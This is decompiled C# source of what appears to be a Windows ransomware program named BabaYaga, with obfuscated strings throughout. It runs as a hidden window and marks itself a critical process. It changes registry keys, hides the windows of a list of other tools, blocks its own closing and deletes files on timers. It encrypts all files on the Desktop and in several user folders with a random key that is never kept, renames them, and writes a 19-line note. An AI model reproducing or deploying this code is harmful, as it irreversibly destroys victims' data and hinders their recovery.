using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace BabaYaga;

public class Form1 : Form
{
	public class GClass0
	{
		public void method_0(string string_0, string string_1)
		{
			byte[] byte_ = File.ReadAllBytes(string_0);
			byte[] bytes = Encoding.UTF8.GetBytes(string_1);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = GClass1.smethod_0(byte_, bytes);
			File.WriteAllBytes(string_0, bytes2);
			File.WriteAllBytes(string_0, bytes2);
			File.Move(string_0, string_0 + GClass2.smethod_0("*Ŧɬ\u0362"));
		}
	}

	public class GClass1
	{
		public static byte[] smethod_0(byte[] byte_0, byte[] byte_1)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(byte_0, 0, byte_0.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	private const int int_0 = 0;

	private IContainer icontainer_0 = null;

	private Timer timer_0;

	private Timer timer_1;

	private Timer timer_2;

	private Timer timer_3;

	private Timer timer_4;

	private Timer timer_5;

	public Form1()
	{
		method_4();
	}

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr intptr_0, int int_1, ref int int_2, int int_3);

	[DllImport("User32")]
	private static extern int ShowWindow(int int_1, int int_2);

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Opacity(0.0);
		((Form)this).set_Size(new Size(50, 50));
		((Form)this).set_Location(new Point(-100, -100));
		timer_2.Start();
		int int_ = 1;
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref int_, 4);
		Process.EnterDebugMode();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = GClass2.smethod_0("dūɡ\u032aѦպ٤");
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.Arguments = GClass2.smethod_0("QŅɈ\u0347ю\u0557ٱ\u073e࠲ॺ\u0a3b\u0b59ణ\u0d44\u0e75\u0f79ၺᅠቾ፵ᑣᔰᘩᜨᠭᥥ\u1a68\u1b6bᱪᵤṴἦ⁆ℾ≟⍠⑮╯⚋➓⢚⦎⫛⯕Ⲟⶊ⺖⾘め㇔㋖㎇㒂㖕㚝㞀㢌㦁㪎㯏㳓㶮㻇㿀䃃䇄䊂䎖䒕䖒䚶䞼䣽䧱䪨䯺䳴䶪价俻傽凴劐叨咍喲嚠垡墹妡媬宸峩差廡忦悡憡抯揢撂旺曣柜棒槓櫏毗泞淊溗澐炓熔狇珓瓚痕盀矙磃禌窄篌粉緫纝翺胲臍苍菆蓎藗蛬蟂裎觥諨诮購践躤辤郉釘鋼鏵链闾雚韇颣駩髳鯯鲩鶮麡龦ꃬꇧꋢꏡꓭꗳꙟꜽꡇꤠ\uaa2cꬓ갗괜긘꼁뀆넨눠댋됂딄똊뜃롞륞먷묦밆봏븈뼈쀰섭쉍쌇쐙씅왿읱젺줮쨺쬴찭쵸칲켣퀦턱툡팼퐰픽혪흫\ud877\ud90a\uda6b\udb6c\udc6f\udd68\ude23\udf23\ue029\ue164\ue200\ue378\ue41d\ue517\ue656\ue750\ue859\ue953\uea4c\ueb49\uec65\ued6b\uee4e\uef45\uf041\uf151\uf25e\uf301\uf403\uf56c\uf663\uf741\uf84a弄海ﭿﱠﴆ﹂～@Ąȅ\u0304ЁՔپݵ\u0878ॳ੬୴హഷ\u0e71༶\u1056ᄮ\u124fፅᑸᕾᙫᝡ\u187a\u197f\u1a57᭙ᱰᵻṳὣ\u2068ℷ∱⍞③╭⚛⟐⢘⦄⪞⯚ⳟⷞ⻗⾟ゖ㆕㊐㎞㒂㗐㚬㟔㢱㦻㪂㮄㲍㶇㺐㾕䂹䆷䊚䎑䒕䖅䚲䟭䣯䦀䪸䮷䲽䷶亲侮傰凴勼厵咣喱嚡垺壭姩媾容岬嶺庩徧您憡拦揸撇无暙枘條榚檝殚泍淙滜濓烚燃狝玒璞痖皏短碗称竼篃糇緌终翑胖臸苰菛蓒藔蛺蟳袮覮誻讼貿趸軾迵郴釷鋿鏡钱闓隵韒飚駥髥鯮鳦鷿黴鿚ꃖꇽꋰꏶꓤꗭꙌꝌꡝ\ua953ꨜ\uab08갘괖긃꽖끐넁눀댗됃딞똎뜃레륉멑묬뱉뵎빁뽆쀑섅숈쌇쐎씗옱읾졲줺쩻쬙챣촄츀켿퀻터툼팥퐢플혜휷\ud83e\ud938\uda2e\udb27\udc7a\udd7a\ude1b\udf22\ue037\ue12d\ue235\ue327\ue433\ue533\ue61f\ue718\ue81b\ue91c\uea52\ueb59\uec58\ued5b\uee5b\uef45\uf015\uf177\uf209\uf36e\uf466\uf559\uf641\uf74a\uf842拏縉ﭶﱺﵑ﹔ｒ@ŉȐ\u0310ѽՄ٭ݷ\u086bॹ੩୩హഷ\u0e70ཤ\u1074ᅺቧጲᐴᕥᙼᝫ\u187fᥢ\u1a6a᭧ᱬᴭḽὀ‥Ⅱ≻⍫⑵");
		Process.Start(processStartInfo);
		timer_4.Start();
		timer_5.Start();
		RegistryKey registryKey = Registry.LocalMachine.CreateSubKey(GClass2.smethod_0("fŻɵ\u0366Ѧձٽݫ\u0871ॡ\u0a42\u0b49\u0c5b\u0d47๔ཉ၃ᅐቿ፵ᑈᕎᙻ\u1771ᡪ\u196fᨻ᭔ᱍᵄṔὣ\u2067Ⅶ≶⍼⑥╆♪❼⡾⥥⩤⭤ⱕⵟ\u2e6e⽨どㅫ㉤㍭㑯"));
		registryKey.SetValue(GClass2.smethod_0("VŬɦ\u036eѭ"), GClass2.smethod_0("`ũɳͶѸ"), RegistryValueKind.String);
		RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(GClass2.smethod_0("jŷɱ\u0362Ѣյ١ݷ\u086dॽ\u0a46\u0b4d\u0c5f\u0d43๘ཅ၏ᅜቻ፱ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1f7f⁷Ⅼ≁⍳⑧╧♺❽⡿⥌⩟⭡ⱡⵥ\u2e68⽣ぬㅻ㉛㍕㑼㕷㙷㝧㡬"));
		registryKey2.SetValue(GClass2.smethod_0("JŤɿ\u036aѨե٭ݓࡧॶ੯\u0b4e\u0c65൳"), 1, RegistryValueKind.String);
		RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey(GClass2.smethod_0("jŗɑ\u0342тՕفݗ\u086dॽ\u0a46\u0b4d\u0c5f\u0d43๘ཅ၏ᅜቻ፱ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1f7f⁷Ⅼ≁⍳⑧╧♺❽⡿⥌⩟⭡ⱡⵥ\u2e68⽣ぬㅻ㉛㍕㑼㕷㙷㝧㡬"));
		registryKey3.SetValue(GClass2.smethod_0("PźɡͰѲգ٫ݟࡩ६\u0a63\u0b7a౼൵\u0e7fད\u106bᅬቮ፲"), 1, RegistryValueKind.DWord);
		RegistryKey registryKey4 = Registry.CurrentUser.CreateSubKey(GClass2.smethod_0("yņɎ\u0353ёՄ\u0656\u0746\u087eॱ\u0a4f୳౷ൾ\u0e75\u0f7e\u1069ᅅቕ\u137eᑵᕧᙻᝠ\u187d\u1977\u1a64᭓᱙ᵤṢὯ\u2065ⅾ≻⍛\u2455╼♷❷⡧⥬"));
		registryKey4.SetValue(GClass2.smethod_0("NŠɻ\u0366Ѥթ١\u0740ࡏ\u0945"), 1, RegistryValueKind.DWord);
	}

	private void method_0(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(100.0);
	}

	public byte[] method_1(byte[] byte_0, byte[] byte_1)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	private void timer_0_Tick(object sender, EventArgs e)
	{
		timer_0.Stop();
		smethod_1();
	}

	private void timer_1_Tick(object sender, EventArgs e)
	{
		timer_1.Stop();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string path = folderPath + GClass2.smethod_0("Půɯͺѣճ٩ݵ\u082a४੬୨");
		string environmentVariable = Environment.GetEnvironmentVariable(GClass2.smethod_0("^řɌ\u035aїՔي\u0742ࡊ\u094e\u0a44"));
		string text = Path.Combine(environmentVariable, GClass2.smethod_0("Mŧɰ\u0368ѩի٢ݦ\u0872"));
		string path2 = text + GClass2.smethod_0("Půɯͺѣճ٩ݵ\u082a४੬୨");
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
		string path3 = folderPath2 + GClass2.smethod_0("Půɯͺѣճ٩ݵ\u082a४੬୨");
		string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		string path4 = folderPath3 + GClass2.smethod_0("Půɯͺѣճ٩ݵ\u082a४੬୨");
		if (File.Exists(path))
		{
			File.Delete(path);
		}
		if (File.Exists(path2))
		{
			File.Delete(path2);
		}
		if (File.Exists(path3))
		{
			File.Delete(path3);
		}
		if (File.Exists(path4))
		{
			File.Delete(path4);
		}
		timer_1.Start();
	}

	public static string smethod_0(int int_1)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < int_1--)
		{
			stringBuilder.Append(GClass2.smethod_0("¥ơʡΥҥי\u06d9ߕ\u08d5\u09d1\u0ad1\u0bd5\u0cd5\u0dd9໙࿅Ⴥᇁ\u12c1Ꮕᓅᗙᛙ៕ᣕ᧑\u1aeb\u1bebᳫ\u1de3ợΰ\u20e3⇫⋫⏫⓫◓⛓⟓⣓⧋⫋⯋ⳋⷃ⻃⿃ッ㇋㋋㏋㒡㖽㚽㞹㢹㦽㪽㮱㲱㶷㺧㿅䂧䆧䊧䏟䒦䕕䙖䝔䠣䥐乫佫䡁䤱䨵䭏呁啎噁圹倹兘别匧尨崠幘彙塗大婘孞摐敕是朮性愞扢捥氞洗湫漗氹洵渵漱瀱焵爵猹琹甥瘥眡砡礥稥笹簺紴縲缰耳脺舸蕷艵茔聼腼踆輂豽贗訕講蠙褁阇靹鐚镵鈗錅遨酨鹯鼜鰌鴍騉鬖惝饬꘍ꝫꐓꔙꈖꌪꀵꅟ깝꼡갣굞\uaa36ꬺ\ua83aꤡ똧띙됺땕눷댥끈녈빏뼼밬봨먬묶䃽륌옭읋쐳씹")[random.Next(GClass2.smethod_0("¥ơʡΥҥי\u06d9ߕ\u08d5\u09d1\u0ad1\u0bd5\u0cd5\u0dd9໙࿅Ⴥᇁ\u12c1Ꮕᓅᗙᛙ៕ᣕ᧑\u1aeb\u1bebᳫ\u1de3ợΰ\u20e3⇫⋫⏫⓫◓⛓⟓⣓⧋⫋⯋ⳋⷃ⻃⿃ッ㇋㋋㏋㒡㖽㚽㞹㢹㦽㪽㮱㲱㶷㺧㿅䂧䆧䊧䏟䒦䕕䙖䝔䠣䥐乫佫䡁䤱䨵䭏呁啎噁圹倹兘别匧尨崠幘彙塗大婘孞摐敕是朮性愞扢捥氞洗湫漗氹洵渵漱瀱焵爵猹琹甥瘥眡砡礥稥笹簺紴縲缰耳脺舸蕷艵茔聼腼踆輂豽贗訕講蠙褁阇靹鐚镵鈗錅遨酨鹯鼜鰌鴍騉鬖惝饬꘍ꝫꐓꔙꈖꌪꀵꅟ깝꼡갣굞\uaa36ꬺ\ua83aꤡ똧띙됺땕눷댥끈녈빏뼼밬봨먬묶䃽륌옭읋쐳씹").Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void smethod_1()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable(GClass2.smethod_0("^řɌ\u035aїՔي\u0742ࡊ\u094e\u0a44"));
		string text = Path.Combine(environmentVariable, GClass2.smethod_0("Mŧɰ\u0368ѩի٢ݦ\u0872"));
		string text2 = Path.Combine(environmentVariable, GClass2.smethod_0("MŧɤͳѨա٭ݶ\u0872"));
		string text3 = Path.Combine(environmentVariable, GClass2.smethod_0("XŮɥͱѱձ٧ݲ"));
		string[] files = Directory.GetFiles(folderPath + GClass2.smethod_0("]"), GClass2.smethod_0("+"), SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + GClass2.smethod_0("]"), GClass2.smethod_0("+"), SearchOption.AllDirectories);
		string[] files3 = Directory.GetFiles(text2 + GClass2.smethod_0("]"), GClass2.smethod_0("+"), SearchOption.TopDirectoryOnly);
		string[] files4 = Directory.GetFiles(text3 + GClass2.smethod_0("]"), GClass2.smethod_0("+"), SearchOption.AllDirectories);
		GClass0 gClass = new GClass0();
		string string_ = smethod_0(3000);
		for (int i = 0; i < files.Length; i++)
		{
			gClass.method_0(files[i], string_);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			gClass.method_0(files2[j], string_);
		}
		for (int k = 0; k < files4.Length; k++)
		{
			gClass.method_0(files4[k], string_);
		}
		for (int l = 0; l < files3.Length; l++)
		{
			gClass.method_0(files3[l], string_);
		}
	}

	public void method_2()
	{
		method_3();
	}

	public void method_3()
	{
		string userName = Environment.UserName;
		string text = GClass2.smethod_0("JĲɛ\u0353Ѷաٱݱ\u085d");
		string text2 = GClass2.smethod_0("OŖɴ\u0363Ѥպ٢ݼࡗॸ੬୩\u0c63൫\u0e60༪ၷᅺት");
		string path = text + userName + text2;
		string[] contents = new string[19]
		{
			GClass2.smethod_0("ałɃ\u035bљԈ؈ݦࡊ\u0949\u0a04\u0b5a\u0c4dൔ๒\u0f3fၷᅰቬ፴ᑨᕭᙹ\u1779ᡢ\u1935\u1a72᭺᱾ᵴṣἯ\u206fⅿ≩⌫⑯╧♫❵⡿⥵⩰⭦ⱦⴠ"),
			GClass2.smethod_0(""),
			GClass2.smethod_0("ÁēȒ\u035dЅԔ؏ݙࠑचਆଚఆഇณ༟ငᅏለጄ᐀ᔎᘙᝉ᠉ᤕᨃᭅᰁᴍḁἓ’ℯ∪⌸\u2438╻☭✰⠬⤿⩶⬔Ⱁⴀ\u2e72⽣づㅹ㉮㌬㐠㔬㘥㜻㠡㤳㨫㭫㱤㴍㸭㽡䀯䅑䉛䌝䑟䕚䙔䜙䡐䥒䩚䭅䰔䵊九佄倐兛剁匍呞啎噙坝塇奕婃嬅层嵊幎彄恓愿扩捴摨敳晵杬桬椷橹歠汦洳湡潡灵煬牧獬瑠甫癮睬硫祵穿筵籰絬繰缯"),
			GClass2.smethod_0("\\Űɷ\u033aѫս٧ݷ\u087c०ਲ਼୦౾ൿ\u0e63\u0f7d\u102dᅭቹ፯ᐩᕽᙴᝣᡩᥡ\u1a70\u1b71\u1c2f"),
			GClass2.smethod_0("\u0017Ļɼ\u0322еԬٸܠ࠷\u093bਠ୳ద\u0d3e\u0e70༽\u102bᄾሸጤᐸᔬᙨ\u1734ᠩ\u1928ᨡ᭣᰻ᴮḵὍ„⅛≕⍗\u245f╊☘❑⡙⥇⨔⭕ⱀⵔ\u2e55⼏すㅟ㉅㍟㑏㔉㙜㝈㠆㥀㩉㭂㱋㵍㸀㽾䁰䅹䈼䍺䑮䕭䙹䝴䡾䤵䨦䬾䰡䴱乵佡偭兿創卻呾啬噬圧塠奬婨学山崡"),
			GClass2.smethod_0("^ěț\u031dџԐ\u0602܌ࠆऄਚ\u0b0eఎ\u0d49ฉ༉ဂᅅምጌᐗᔓᙀ\u1739ᠷ\u1931ᨹᬨᱺᴪḰἸ‣ℹ∰⍳\u243c┾☤❯⠭⤢⨢⬿Ⱛⴠ⸦⽧〰ㄤ㈨㌶㐣㔣㘬㝚㠞㥔㩒㭝㱕㵋㹕㽖䁂䅜䉛䍝䐒䕝䙙䝄䡋䤍䩈䭊䱞䵈乊但偕兀剗匏吂啃噁坼塵奨婬孨尶崹年彶恤慲扱挳摷敩晳杪桢椭橿正汯浬湼潴瀦煠牰獠琬用"),
			GClass2.smethod_0("nřɀ\u0314ћՓهݕࠏग़\u0a42ଌ\u0c5b\u0d4b๐༈ဃᄕሕጔᐃᕋᙏᜀ\u187d\u1977\u1a69\u1b7fᱴᵳṷἸ\u2063ⅹ∵⍰⑶╱♣❩⡿⥺⨭⭣Ɀⵢ\u2e6c⽺〧ㅠ㉬㍨㑦㕱㘯"),
			GClass2.smethod_0("\u0002ıɡ\u0333ѐՑ\u0653ܜ\u085a\u0949ਙ\u0b4f\u0c52ഖ๒ད၇ᄒቓፙᑛᕍᙂᝅᡅᥙᨉ᭑᱈ᵓḂὈ⁏ℂ≆⍅⑫┾♼❰⡷⤺⩠⭷Ɫⵤ⸵⽰ぶㅱ㉣㍩㑿㕺㙨㝨㠫㥮㩨㭼㱦㴦㹧㽥䁠䅩䈯"),
			GClass2.smethod_0(""),
			GClass2.smethod_0("Tĭɑ\u032f"),
			GClass2.smethod_0("Nžɷͼѵյٳݧ࠴।\u0a77\u0b31\u0c71ൽ\u0e6b༭\u1062ᅤቾጩᑻᕤᙧᝨᡩᥦ\u1a70\u1b72"),
			GClass2.smethod_0(""),
			GClass2.smethod_0("KŨɨͱѥՠٶ\u073b"),
			GClass2.smethod_0("\u0005ĝɶ\u035eчՁق\u0742ࡍ\u094fਊଢ଼\u0c47ൕฆཇ\u1056ᅌቕፒᑅᕭᘾ᜵ᡴ\u196f\u1a6e᭩ᱫᴭḹἺ\u2063Ⅴ≥⌿⑤╠♼❽⡾⥤⩠⭬Ⱬ\u2d73⸨⽪ぶㅤ㈭㌨"),
			GClass2.smethod_0("\u000fĒɸ\u0348ќՙكݓࠕ\u0955\u0a50\u0b51\u0c5e\u0d45แཚဍᅃቅጊᑄᕉᙎᝊ᠗ᥐᩌ᭐ᰁᴈṷὪ\u2069Ⅼ∡⌵\u2436╵♶❿⡹⤦⩧⭽Ᵽⴢ\u2e75⽷でㅨ㉨㍾㑭㔦㙨㝨㡬㥫㩭㬭㰨"),
			GClass2.smethod_0("\u001cĀɺ\u035eт՞\u064c܈ࡂऋ\u0a48\u0b45\u0c4aൎกཔၰᄾቨ፯ᐻᔲᙚ\u1777ᡵᥤ\u1a74᭘ᱼᵱṺή⁽ⅎ≠⍭③╦☻❼⡨⥴⨫⭧ⱬⵯ⸨"),
			GClass2.smethod_0(""),
			GClass2.smethod_0("^šɩͳСնؤݢ\u086e७"),
			GClass2.smethod_0("Qźɻͷвս٥ݬࡥभ੭\u0b65౮ഩ\u0e60སၰᅠሤ፥ᑷᕯ")
		};
		File.WriteAllLines(path, contents);
	}

	private void timer_2_Tick(object sender, EventArgs e)
	{
		method_2();
		timer_2.Stop();
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void timer_3_Tick(object sender, EventArgs e)
	{
		timer_3.Stop();
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.ProcessName == GClass2.smethod_0("`ůɥ"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == GClass2.smethod_0("uţɢ\u0361ѧիٵ"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == GClass2.smethod_0("]žɤ\u0369Ѭջٴݮࡤ१੨୧\u0c73"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == GClass2.smethod_0("vŠɠ\u036eѵ"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == GClass2.smethod_0("zŦɿ\u0362Ѵն٬ݦ\u086e७"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == GClass2.smethod_0("}žɤ\u0369Ѭջٴݮࡤ१੨୧\u0c73"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == GClass2.smethod_0("^ſɣ\u0368ѯպٻݯࡧ०੯୦\u0c70ള"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == GClass2.smethod_0("nůɢ"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == GClass2.smethod_0("jūɦ\u032aѦպ٤"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == GClass2.smethod_0("\u007fūɺ\u0363Ѫաٷܪࡦॺ\u0a64"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == GClass2.smethod_0("sŧɶ\u036fѮեٳ"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == GClass2.smethod_0("fŰɤͷѷշ٨"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == GClass2.smethod_0("eŭɶ\u036cѯդ"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			if (process.ProcessName == GClass2.smethod_0("aůɷ\u0361ѥխٹ"))
			{
				int int_ = process.MainWindowHandle.ToInt32();
				ShowWindow(int_, 0);
			}
			timer_3.Start();
		}
	}

	private void timer_4_Tick(object sender, EventArgs e)
	{
		File.Delete(GClass2.smethod_0("XĠɅ\u034fѾոٱݻࡤॡ\u0a4d\u0b43\u0c76ൽ\u0e79ཀྵၦᄹሻፔᑤᕫᙡᜪᡦ\u197a\u1a64"));
	}

	private void timer_5_Tick(object sender, EventArgs e)
	{
		timer_5.Stop();
		string path = GClass2.smethod_0("XĠɅ\u034fѾոٱݻࡤॡ\u0a4d\u0b43\u0c76ൽ\u0e79ཀྵၦᄹሻፔᑯᕧᙩᜪᡧ\u196e\u1a6d");
		string path2 = GClass2.smethod_0("YģɄ\u0340ѿջ\u0670ݼࡥ\u0962\u0a4cଡ଼౷ൾ\u0e78\u0f6e\u1067ᄺሺ\u135bᑥᕬᘪᝧᡮᥭ");
		string path3 = GClass2.smethod_0("\\ĤɁ\u034bѲմٽݷࡠ॥\u0a49\u0b47౪ൡ\u0e65\u0f75\u1062ᄽሿፐᑼᕣᙧᝤᡨᥧ\u1a61ᬪᱦᵺṤ");
		string path4 = GClass2.smethod_0("gęɾͶщձٺݲ\u086b२\u0a46\u0b4aౡ\u0d64\u0e62\u0f70ၹᄠሠፍᑴᕽᙧ\u177bᡩ\u1979\u1a79᭕ᱬᵮṵὮ\u202aⅰ≻⍲");
		if (File.Exists(path))
		{
			File.Delete(path);
		}
		if (File.Exists(path2))
		{
			File.Delete(path2);
		}
		if (File.Exists(path3))
		{
			File.Delete(path3);
		}
		if (File.Exists(path4))
		{
			File.Delete(path4);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void method_4()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_0060: Expected O, but got Unknown
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		//IL_0071: Expected O, but got Unknown
		//IL_01f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0201: Expected O, but got Unknown
		icontainer_0 = new Container();
		timer_0 = new Timer(icontainer_0);
		timer_1 = new Timer(icontainer_0);
		timer_2 = new Timer(icontainer_0);
		timer_3 = new Timer(icontainer_0);
		timer_4 = new Timer(icontainer_0);
		timer_5 = new Timer(icontainer_0);
		((Control)this).SuspendLayout();
		timer_0.set_Enabled(true);
		timer_0.set_Interval(3000);
		timer_0.add_Tick((EventHandler)timer_0_Tick);
		timer_1.set_Enabled(true);
		timer_1.add_Tick((EventHandler)timer_1_Tick);
		timer_2.set_Interval(6000);
		timer_2.add_Tick((EventHandler)timer_2_Tick);
		timer_3.set_Enabled(true);
		timer_3.set_Interval(10);
		timer_3.add_Tick((EventHandler)timer_3_Tick);
		timer_4.set_Enabled(true);
		timer_4.set_Interval(5000);
		timer_4.add_Tick((EventHandler)timer_4_Tick);
		timer_5.set_Enabled(true);
		timer_5.set_Interval(5000);
		timer_5.add_Tick((EventHandler)timer_5_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSizeMode((AutoSizeMode)0);
		((Form)this).set_ClientSize(new Size(120, 23));
		((Form)this).set_ControlBox(false);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name(GClass2.smethod_0("Cūɱ\u036fа"));
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
